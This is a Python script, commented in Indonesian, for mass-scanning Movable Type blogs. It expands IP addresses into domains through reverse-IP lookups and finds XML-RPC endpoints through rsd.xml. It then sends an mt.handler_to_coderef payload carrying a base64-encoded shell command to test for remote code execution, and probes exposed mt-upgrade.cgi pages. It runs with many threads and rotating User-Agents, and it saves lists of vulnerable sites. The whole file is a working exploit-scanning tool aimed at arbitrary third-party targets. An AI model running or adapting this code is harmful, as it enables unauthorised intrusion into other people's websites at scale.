import requests
import argparse
import sys
import time
import re
import socket
import base64
import threading
import json
import html
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Set, List, Optional, Dict, Tuple
from datetime import datetime
import urllib3
from urllib.parse import urlparse, urljoin
import signal

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

class MTExploiter:
    def __init__(self, threads: int = 100, timeout: int = 5, output_file: str = "results.txt"):
        self.threads = threads
        self.timeout = timeout
        self.output_file = output_file
        
        # SUPER FAST - HANYA 1 PATH!
        self.rsd_path = "/rsd.xml"
        
        # Cache untuk koneksi
        self.session = requests.Session()
        
        # Rotasi User-Agent
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        
        self.lock = threading.Lock()
        self.processed_domains = set()
        
        # Hasil
        self.results = {
            'total_targets': 0,
            'total_domains': 0,
            'unique_domains': 0,
            'mt_found': [],        # (domain, rsd_url, xmlrpc_url, version, response_time)
            'vuln_xmlrpc': [],     # (domain, xmlrpc_url, response, status_code, message)
            'vuln_upgrade': [],    # (domain, upgrade_url, version, status_code, message)
            'not_vuln': []         # (domain, reason)
        }
        
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, sig, frame):
        print(f"\n{Colors.YELLOW}[!] Interrupt received, menyimpan hasil...{Colors.RESET}")
        self.save_results()
        self.print_summary()
        sys.exit(0)
    
    def print_banner(self):
        banner = f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗
║    Movable Type Mass Scanner v7.0 - SUPER FAST            ║
║    Hanya scan /rsd.xml | Upgrade vuln hanya jika 200      ║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}
        """
        print(banner)
    
    def get_headers(self):
        """Dapatkan headers dengan random User-Agent"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
    
    def get_base_url(self, url: str) -> str:
        """Mendapatkan base URL - SUPER FAST"""
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}"
    
    def domain_to_ip(self, domain: str) -> Optional[str]:
        """Konversi domain ke IP - dengan cache"""
        try:
            domain = domain.lower().strip()
            domain = re.sub(r'^https?://', '', domain)
            domain = domain.split('/')[0]
            
            if self.is_valid_ip(domain):
                return domain
            
            # Cache DNS lookup
            ip = socket.gethostbyname(domain)
            return ip
        except:
            return None
    
    def is_valid_ip(self, ip: str) -> bool:
        """Validasi IP - SUPER FAST dengan regex"""
        return bool(re.match(r'^\d+\.\d+\.\d+\.\d+$', ip))
    
    def is_status_ignored(self, status_code: int) -> bool:
        """Cek status yang diabaikan"""
        return status_code in [404, 401, 500]
    
    # ============ REVERSE IP - OPTIMIZED ============
    
    def reverse_ip_hackertarget(self, ip: str) -> Set[str]:
        """Reverse IP via hackertarget - FAST"""
        domains = set()
        try:
            url = f"https://api.hackertarget.com/reverseiplookup/?q={ip}"
            resp = self.session.get(url, headers=self.get_headers(), timeout=self.timeout)
            
            if resp.status_code == 200:
                for line in resp.text.split('\n'):
                    line = line.strip()
                    if line and '.' in line and ' ' not in line and 'error' not in line.lower():
                        domains.add(line.lower())
        except:
            pass
        return domains
    
    def reverse_ip_yougetsignal(self, ip: str) -> Set[str]:
        """Reverse IP via yougetsignal - FAST"""
        domains = set()
        try:
            url = "https://domains.yougetsignal.com/domains.php"
            data = {'remoteAddress': ip, 'key': ''}
            headers = self.get_headers()
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            
            resp = self.session.post(url, data=data, headers=headers, timeout=self.timeout)
            
            if resp.status_code == 200:
                try:
                    result = resp.json()
                    if result.get('status') == 'Success':
                        for domain in result.get('DomainArray', []):
                            if domain and len(domain) >= 2:
                                domains.add(domain[0].lower())
                except:
                    pass
        except:
            pass
        return domains
    
    def get_domains_from_ip(self, ip: str) -> Set[str]:
        """Reverse IP dari semua sumber - PARALLEL"""
        all_domains = set()
        
        with ThreadPoolExecutor(max_workers=2) as executor:
            futures = {
                executor.submit(self.reverse_ip_hackertarget, ip): 'hackertarget',
                executor.submit(self.reverse_ip_yougetsignal, ip): 'yougetsignal'
            }
            
            for future in as_completed(futures):
                try:
                    domains = future.result(timeout=self.timeout + 2)
                    if domains:
                        all_domains.update(domains)
                except:
                    pass
        
        return all_domains
    
    # ============ RSD.XML - SUPER FAST (HANYA 1 PATH) ============
    
    def check_rsd(self, domain: str) -> Tuple[bool, str, str, str, float]:
        """
        Cek rsd.xml - SUPER FAST (hanya /rsd.xml)
        Returns: (found, rsd_url, xmlrpc_url, version, response_time)
        """
        base = self.get_base_url(domain)
        rsd_url = base + self.rsd_path
        start_time = time.time()
        
        try:
            resp = self.session.get(rsd_url, headers=self.get_headers(), 
                                   timeout=self.timeout, verify=False)
            response_time = time.time() - start_time
            
            if resp.status_code == 200 and '<rsd' in resp.text and '<api' in resp.text:
                xmlrpc_url = self.extract_xmlrpc_from_rsd(resp.text)
                if xmlrpc_url:
                    version = self.extract_version(resp.text)
                    return True, rsd_url, xmlrpc_url, version, response_time
        except:
            pass
        
        return False, None, None, None, 0
    
    def extract_xmlrpc_from_rsd(self, rsd_content: str) -> Optional[str]:
        """Ekstrak XML-RPC URL - FAST dengan regex"""
        # Prioritas: MetaWeblog
        meta_match = re.search(r'<api[^>]*name=["\']MetaWeblog["\'][^>]*apiLink=["\']([^"\']+)["\']', 
                              rsd_content, re.I)
        if meta_match:
            return meta_match.group(1)
        
        # Fallback: MovableType
        mt_match = re.search(r'<api[^>]*name=["\']MovableType["\'][^>]*apiLink=["\']([^"\']+)["\']', 
                            rsd_content, re.I)
        if mt_match:
            return mt_match.group(1)
        
        return None
    
    def extract_version(self, rsd_content: str) -> str:
        """Ekstrak version - FAST"""
        engine_match = re.search(r'<engineName>([^<]+)</engineName>', rsd_content, re.I)
        if engine_match:
            engine = engine_match.group(1)
            ver_match = re.search(r'(\d+\.\d+(?:\.\d+)?)', engine)
            if ver_match:
                return ver_match.group(1)
        return "Unknown"
    
    def is_version_4(self, version: str) -> bool:
        """Cek versi 4.x - FAST"""
        return version.startswith('4.') if version != "Unknown" else False
    
    def find_upgrade_cgi(self, base_url: str, xmlrpc_url: str) -> Optional[str]:
        """Cari mt-upgrade.cgi - FAST (hanya 1 path)"""
        parsed = urlparse(xmlrpc_url)
        if parsed.path:
            path_parts = parsed.path.split('/')
            if len(path_parts) > 1:
                base_path = '/'.join(path_parts[:-1])
                upgrade_url = f"{parsed.scheme}://{parsed.netloc}{base_path}/mt-upgrade.cgi"
                
                try:
                    # HEAD request untuk cek keberadaan (lebih cepat)
                    resp = self.session.head(upgrade_url, headers=self.get_headers(), 
                                            timeout=self.timeout, verify=False)
                    if resp.status_code == 200:
                        return upgrade_url
                except:
                    pass
        return None
    
    # ============ VULNERABILITY CHECK ============
    
    def check_xmlrpc_vuln(self, xmlrpc_url: str) -> Tuple[bool, str, str, int]:
        """
        Cek kerentanan mt-xmlrpc.cgi
        Returns: (is_vulnerable, message, response_output, status_code)
        """
        test_cmd = base64.b64encode(b'echo MT_TEST').decode('utf-8')
        
        xml_payload = f'''<?xml version="1.0"?>
<methodCall>
<methodName>mt.handler_to_coderef</methodName>
<params>
<param><value><base64>{test_cmd}</base64></value></param>
</params>
</methodCall>'''
        
        try:
            headers = self.get_headers()
            headers['Content-Type'] = 'text/xml'
            
            resp = self.session.post(xmlrpc_url, data=xml_payload, headers=headers,
                                    timeout=self.timeout, verify=False)
            
            status = resp.status_code
            
            if self.is_status_ignored(status):
                return False, f"Not Vuln - HTTP {status}", "", status
            
            if status == 200:
                if len(resp.text) > 100 and 'html' not in resp.text.lower():
                    return True, "VULN - dengan output", resp.text[:500], status
                elif 'fault' in resp.text.lower():
                    return True, "VULN - XML-RPC aktif", resp.text[:200], status
            
            return False, f"Not Vuln - HTTP {status}", "", status
                
        except Exception as e:
            return False, f"Error: {str(e)[:50]}", "", 0
    
    def check_upgrade_vuln(self, upgrade_url: str) -> Tuple[bool, str, int]:
        """
        Cek kerentanan mt-upgrade.cgi
        HANYA VULN JIKA HTTP 200!
        """
        try:
            headers = self.get_headers()
            resp = self.session.get(upgrade_url, headers=headers, 
                                   timeout=self.timeout, verify=False)
            
            status = resp.status_code
            
            # HANYA 200 YANG DIANGGAP VULN
            if status == 200:
                content = resp.text.lower()
                if 'upgrade' in content and 'database' in content:
                    return True, "VULN - Upgrade script accessible", status
                elif 'movable type' in content and ('upgrade' in content or 'install' in content):
                    return True, "VULN - Halaman upgrade ditemukan", status
            
            return False, f"Not Vuln - HTTP {status}", status
            
        except Exception as e:
            return False, f"Error: {str(e)[:50]}", 0
    
    # ============ PROCESSING ============
    
    def process_domain(self, domain: str):
        """Process satu domain - SUPER FAST"""
        if domain in self.processed_domains:
            return
        
        with self.lock:
            self.processed_domains.add(domain)
            self.results['total_domains'] += 1
        
        # Cek rsd.xml - hanya 1 request!
        found, rsd_url, xmlrpc_url, version, resp_time = self.check_rsd(domain)
        
        if not found:
            print(f"{Colors.DIM}  - {domain} [{(resp_time*1000):.0f}ms]{Colors.RESET}")
            print(f"    RSD : Not Found")
            with self.lock:
                self.results['not_vuln'].append((domain, "RSD Not Found"))
            return
        
        # RSD ditemukan
        print(f"{Colors.GREEN}  - {domain} [{(resp_time*1000):.0f}ms]{Colors.RESET}")
        print(f"    RSD : Found")
        print(f"    Version : {version}")
        
        with self.lock:
            self.results['mt_found'].append((domain, rsd_url, xmlrpc_url, version, resp_time))
        
        # CEK XML-RPC
        if xmlrpc_url:
            vuln, message, output, status = self.check_xmlrpc_vuln(xmlrpc_url)
            
            if vuln:
                if status == 200:
                    print(f"{Colors.RED}    mt-xmlrpc.cgi : VULN [HTTP {status}]{Colors.RESET}")
                else:
                    print(f"{Colors.YELLOW}    mt-xmlrpc.cgi : POTENSIAL [HTTP {status}]{Colors.RESET}")
                with self.lock:
                    self.results['vuln_xmlrpc'].append((domain, xmlrpc_url, output, status, message))
            else:
                print(f"{Colors.DIM}    mt-xmlrpc.cgi : Not Vuln [HTTP {status}]{Colors.RESET}")
                with self.lock:
                    self.results['not_vuln'].append((domain, f"XML-RPC Not Vuln - HTTP {status}"))
        
        # CEK UPGRADE - HANYA UNTUK VERSI 4.x
        if self.is_version_4(version):
            base = self.get_base_url(domain)
            upgrade_url = self.find_upgrade_cgi(base, xmlrpc_url)
            
            if upgrade_url:
                vuln, message, status = self.check_upgrade_vuln(upgrade_url)
                
                if vuln and status == 200:
                    print(f"{Colors.RED}    mt-upgrade.cgi : VULN [HTTP {status}] (Versi 4.x){Colors.RESET}")
                    with self.lock:
                        self.results['vuln_upgrade'].append((domain, upgrade_url, version, status, message))
                else:
                    print(f"{Colors.DIM}    mt-upgrade.cgi : Not Vuln [HTTP {status}] (Versi 4.x){Colors.RESET}")
                    with self.lock:
                        self.results['not_vuln'].append((domain, f"Upgrade Not Vuln - HTTP {status}"))
            else:
                print(f"{Colors.DIM}    mt-upgrade.cgi : Not Found (Versi 4.x){Colors.RESET}")
                with self.lock:
                    self.results['not_vuln'].append((domain, "Upgrade Not Found"))
        else:
            print(f"{Colors.DIM}    mt-upgrade.cgi : Skip (bukan 4.x){Colors.RESET}")
    
    def process_target(self, target: str):
        """Process satu target"""
        with self.lock:
            self.results['total_targets'] += 1
            current = self.results['total_targets']
        
        print(f"\n{Colors.CYAN}[{current}] Processing: {target}{Colors.RESET}")
        
        if self.is_valid_ip(target):
            # IP - lakukan reverse IP
            domains = self.get_domains_from_ip(target)
            if domains:
                print(f"{Colors.GREEN}    Found {len(domains)} domains{Colors.RESET}")
                for domain in domains:
                    self.process_domain(domain)
            else:
                print(f"{Colors.YELLOW}    No domains found{Colors.RESET}")
                with self.lock:
                    self.results['not_vuln'].append((target, "No domains found from reverse IP"))
        else:
            # Domain - langsung process
            ip = self.domain_to_ip(target)
            if ip:
                print(f"{Colors.DIM}    IP: {ip}{Colors.RESET}")
            self.process_domain(target)
    
    def scan_targets(self, targets: List[str]):
        """Scan multiple targets"""
        print(f"\n{Colors.BOLD}[+] Memulai scan {len(targets)} targets{Colors.RESET}")
        print(f"[+] Threads: {self.threads}")
        print(f"[+] Timeout: {self.timeout}s\n")
        print(f"{Colors.BOLD}CHECKING:{Colors.RESET}")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.process_target, target): target for target in targets}
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    target = futures[future]
                    print(f"{Colors.RED}[!] Error {target}: {str(e)[:30]}{Colors.RESET}")
    
    # ============ OUTPUT ============
    
    def save_results(self):
        """Simpan hasil dengan LENGKAP"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"mt_fast_{timestamp}.txt"
        
        with open(filename, 'w') as f:
            f.write("="*80 + "\n")
            f.write("MOVABLE TYPE FAST SCAN RESULTS\n")
            f.write(f"Generated: {datetime.now()}\n")
            f.write(f"Total Targets: {self.results['total_targets']}\n")
            f.write(f"Total Domains Found: {self.results['total_domains']}\n")
            f.write(f"Unique Domains: {len(self.processed_domains)}\n")
            f.write("="*80 + "\n\n")
            
            # 1. XML-RPC VULNERABLE
            if self.results['vuln_xmlrpc']:
                f.write("\n[!] XML-RPC VULNERABLE / POTENSIAL\n")
                f.write("-"*60 + "\n")
                for i, (domain, url, output, status, message) in enumerate(self.results['vuln_xmlrpc'], 1):
                    f.write(f"\n{i}. {domain}\n")
                    f.write(f"   URL     : {url}\n")
                    f.write(f"   Status  : HTTP {status}\n")
                    f.write(f"   Message : {message}\n")
                    if output and len(output) > 10:
                        f.write(f"   Output  : {output[:200]}{'...' if len(output) > 200 else ''}\n")
            
            # 2. UPGRADE VULNERABLE (Versi 4.x)
            if self.results['vuln_upgrade']:
                f.write("\n[!] UPGRADE VULNERABLE (Versi 4.x)\n")
                f.write("-"*60 + "\n")
                for i, (domain, url, version, status, message) in enumerate(self.results['vuln_upgrade'], 1):
                    f.write(f"\n{i}. {domain}\n")
                    f.write(f"   Version : {version}\n")
                    f.write(f"   URL     : {url}\n")
                    f.write(f"   Status  : HTTP {status}\n")
                    f.write(f"   Message : {message}\n")
            
            # 3. SEMUA SITE MT DITEMUKAN
            if self.results['mt_found']:
                f.write("\n[+] SEMUA SITE MOVABLE TYPE DITEMUKAN\n")
                f.write("-"*60 + "\n")
                for i, (domain, rsd_url, xmlrpc_url, version, resp_time) in enumerate(self.results['mt_found'], 1):
                    f.write(f"\n{i}. {domain}\n")
                    f.write(f"   Version  : {version}\n")
                    f.write(f"   RSD      : {rsd_url}\n")
                    f.write(f"   XML-RPC  : {xmlrpc_url}\n")
                    f.write(f"   Response : {resp_time*1000:.0f}ms\n")
            
            # 4. RINGKASAN
            f.write("\n" + "="*80 + "\n")
            f.write("RINGKASAN\n")
            f.write("="*80 + "\n")
            f.write(f"Total Targets      : {self.results['total_targets']}\n")
            f.write(f"Total Domains      : {self.results['total_domains']}\n")
            f.write(f"Unique Domains     : {len(self.processed_domains)}\n")
            f.write(f"MT Sites Found     : {len(self.results['mt_found'])}\n")
            f.write(f"XML-RPC Vuln       : {len(self.results['vuln_xmlrpc'])}\n")
            f.write(f"Upgrade Vuln       : {len(self.results['vuln_upgrade'])} (4.x only)\n")
        
        print(f"\n{Colors.GREEN}[✓] Hasil lengkap disimpan di: {filename}{Colors.RESET}")
        
        # Juga simpan dalam format JSON
        json_filename = f"mt_fast_{timestamp}.json"
        with open(json_filename, 'w') as f:
            json.dump({
                'timestamp': str(datetime.now()),
                'total_targets': self.results['total_targets'],
                'total_domains': self.results['total_domains'],
                'unique_domains': len(self.processed_domains),
                'mt_found': [
                    {
                        'domain': d,
                        'rsd_url': r,
                        'xmlrpc_url': x,
                        'version': v,
                        'response_time_ms': rt*1000
                    } for d, r, x, v, rt in self.results['mt_found']
                ],
                'vuln_xmlrpc': [
                    {
                        'domain': d,
                        'url': u,
                        'status_code': s,
                        'message': m,
                        'output_preview': o[:200] if o else ''
                    } for d, u, o, s, m in self.results['vuln_xmlrpc']
                ],
                'vuln_upgrade': [
                    {
                        'domain': d,
                        'url': u,
                        'version': v,
                        'status_code': s,
                        'message': m
                    } for d, u, v, s, m in self.results['vuln_upgrade']
                ]
            }, f, indent=2)
        
        print(f"{Colors.GREEN}[✓] JSON juga disimpan di: {json_filename}{Colors.RESET}")
    
    def print_summary(self):
        """Ringkasan"""
        vuln_xmlrpc_count = len(self.results['vuln_xmlrpc'])
        vuln_upgrade_count = len(self.results['vuln_upgrade'])
        mt_sites_count = len(self.results['mt_found'])
        
        print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}SUMMARY{Colors.RESET}")
        print(f"{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"Total Targets      : {self.results['total_targets']}")
        print(f"Total Domains      : {self.results['total_domains']}")
        print(f"Unique Domains     : {len(self.processed_domains)}")
        print(f"MT Sites Found     : {mt_sites_count}")
        print(f"XML-RPC Vuln       : {vuln_xmlrpc_count}")
        print(f"Upgrade Vuln       : {vuln_upgrade_count} (4.x only)")
        print(f"{Colors.BOLD}{'='*60}{Colors.RESET}")

def main():
    parser = argparse.ArgumentParser(description='MT Scanner v7.0 - SUPER FAST')
    parser.add_argument('-d', '--domain', help='Domain target (pisah dengan koma)')
    parser.add_argument('-i', '--ip', help='IP target (pisah dengan koma)')
    parser.add_argument('-f', '--file', help='File berisi daftar target')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Threads (default: 100)')
    parser.add_argument('--timeout', type=int, default=5, help='Timeout (default: 5)')
    
    args = parser.parse_args()
    
    targets = []
    if args.domain:
        targets = [d.strip() for d in args.domain.split(',')]
        print(f"{Colors.GREEN}[+] Loaded {len(targets)} domain targets{Colors.RESET}")
    elif args.ip:
        targets = [i.strip() for i in args.ip.split(',')]
        print(f"{Colors.GREEN}[+] Loaded {len(targets)} IP targets{Colors.RESET}")
    elif args.file:
        with open(args.file) as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        print(f"{Colors.GREEN}[+] Loaded {len(targets)} targets from {args.file}{Colors.RESET}")
    
    if not targets:
        print("Usage: python index.py -d yen-shop.com")
        print("       python index.py -i 8.8.8.8,1.1.1.1")
        print("       python index.py -f targets.txt")
        sys.exit(1)
    
    scanner = MTExploiter(threads=args.threads, timeout=args.timeout)
    scanner.print_banner()
    scanner.scan_targets(targets)
    scanner.save_results()
    scanner.print_summary()

if __name__ == "__main__":
    main()
